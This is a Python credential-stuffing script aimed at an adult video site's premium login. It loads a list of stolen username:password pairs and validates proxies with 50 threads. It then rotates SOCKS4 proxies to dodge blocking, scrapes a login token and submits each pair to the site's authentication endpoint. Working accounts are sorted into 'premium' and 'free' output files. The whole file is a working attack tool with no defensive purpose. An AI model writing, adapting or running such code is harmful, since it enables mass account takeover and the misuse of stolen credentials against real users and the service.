#python 3
from bs4 import BeautifulSoup as bs
import requests
import json
import re
from time import sleep
import os
from tqdm import tqdm
import queue
from proxy_checker import ProxyChecker
import threading
import colorama
from colorama import Fore
from itertools import cycle

debug = 0
headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0',
 'Accept': 'application/json, text/javascript, */*; q=0.01',
 'Accept-Language': 'en-US,en;q=0.5',
 'Accept-Encoding': 'gzip, deflate, br',
 'Content-Type': 'application/x-www-form-urlencoded',
 'DNT': '1', 'Host': 'rt.pornhub.com',
 'Origin': 'https://rt.pornhub.com',
 'Connection': 'keep-alive',
 'TE': 'Trailers'}
r = requests.Session()
filea = open(input("Input base file name "), 'r')
lines = filea.readlines()
prem = open("premium.txt", 'w')
free = open("free.txt", 'w')
os.system("clear")
pbar = tqdm(total=len(lines))
premium=0
freee=0
prox = open(input("Input proxy file name "), 'r')
q = queue.Queue()
qe = []
qqe = queue.Queue()
checker = ProxyChecker()
gprox = open("good_proxy.txt", "r+")
proxe = prox.readlines()
theads = []
colorama.init()
theades = []
		
def cheak():
	while not q.empty():
		proxs = q.get()
		stat=checker.check_proxy(proxs[0])
		if stat != False:
			gprox.write(proxs[0]+'\n')
			print(Fore.GREEN + "GOOD "+proxs[0])
		else:
			print(Fore.RED + "BAD "+proxs[0])
		q.task_done()

def cheaks():
	for line in proxe:
		if line:
			q.put(line.split('\n'))
		
	for index in range(50):
	        x = threading.Thread(target=cheak)
	        x.start()
	        theads.append(x)

	for x in theads:
		x.join()
			
def apr():
	for line in gprox.read().split('\n'):
		if line:
			qe.append(line)
			
ch = input("Check proxy? y or n. ")

if ch == "y":
	cheaks()
else:
	gprox = prox
	
os.system("clear")

for line in lines:
	if line:
		qqe.put(line.split('\n'))

pbar.set_description("premium="+str(premium)+" free="+str(freee))

def hack():
	apr()
	poolproxy = cycle(qe)
	while not qqe.empty():
		line = qqe.get()
		pr='socks4://'+next(poolproxy)
		proxies = {
			'http':  pr,
			'https': pr
		}
		r.proxies = proxies
		if (debug == 1):
			print("DEBUG "+str(proxies))
		line=line[0].split(':')
		user=line[0].replace("\n", "")
		passw=line[1].replace("\n", "")
		try:
			r.headers.update(headers)
			reqe=r.get('https://www.pornhubpremium.com/premium/login')
			token = re.findall(r'token   = ".+";', reqe.text)
			token = str(token).replace('token   = "', '').replace('";','').replace("['",'').replace("']",'')
			if (debug == 1):
				print("DEBUG "+str(token))
			r.headers.update(headers)
			req=r.post('https://www.pornhubpremium.com/front/authenticate', allow_redirects = True, 	data="redirect=&token="+token+"&taste_profile=&username="+user+"&password="+passw)
			jsond = json.loads(req.text)
			if ((jsond["success"] == '1')or(jsond['user_exists'] == True)):
				if ((jsond["redirect"]=='/')or(jsond["redirect"]=='/')):
					free.write(user+":"+passw+"\n")
					global freee
					freee+=1
				else:
					prem.write(user+":"+passw+"\n")
					global premium
					premium+=1
			if (debug == 1):
				print("DEBUG "+req.url)
				print("DEBUG "+user+":"+passw)
				print("DEBUG "+jsond["success"]+' '+str(jsond['user_exists']))
				print("DEBUG "+str(req.headers))
				print("DEBUG "+jsond["redirect"])
		except:
			err=0
		sleep(0.25)
		pbar.set_description("premium="+str(premium)+" free="+str(freee))
		pbar.update(1)
		qqe.task_done()
		
for th in range(50):
	x = threading.Thread(target=hack)
	x.start()
	theades.append(x)
for x in theades:
	x.join()

pbar.close()
prem.close
free.close
filea.close
